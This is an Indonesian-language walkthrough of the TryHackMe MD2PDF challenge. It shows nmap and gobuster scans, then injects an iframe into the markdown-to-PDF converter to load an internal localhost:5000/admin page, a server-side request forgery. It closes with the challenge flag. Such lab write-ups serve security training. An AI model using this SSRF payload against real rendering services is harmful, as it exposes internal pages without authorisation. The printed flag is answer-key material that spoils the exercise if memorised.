# MD2PDF
- TryHackMe Challenge: https://tryhackme.com/room/md2pdf
- IP Machine: 10.10.187.198

## Task 1 Challenge
- Scanning port menggunakan nmap
```sh
nmap -sC <IP_Machine>
```

- Port 80 (http) terbuka, sekarang kita coba akses halaman web lewat browser dengan url `http://<IP_Machine>`


- MD2PDF adalah singkatan dari [Markdown2PDF](https://github.com/realdennis/md2pdf). Halaman tersebut berfungsi mengubah markup HTML ke format PDF. Hal ini berpotensi untuk melakukan serangan XSS dan SSRF (Server Side Request Forgery).
- Sekarang kita coba temukan halaman tersembunyi dengan tool gobuster
```sh
gobuster dir -u http://<IP_Machine> -w /usr/share/wordlists/dirb/common.txt
```

- Ditemukan halaman **/admin** dari report gobuster. Sekarang kita buka halaman tersebut di browser dengan url `http://<IP_Machine>/admin`. Ternyata halaman tersebut hanya bisa diakses secara internal lewat localhost dan port 5000


- Sekarang kita injekkan iframe ke markup PDF untuk menampilkan isi halaman **/admin**
```sh
<iframe src="http://localhost:5000/admin" height="1000" width="1000">
</iframe>
```

- Tekan tombol Convert to PDF






**Pertanyaan:** What is the flag?

**Jawaban:**
```sh
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```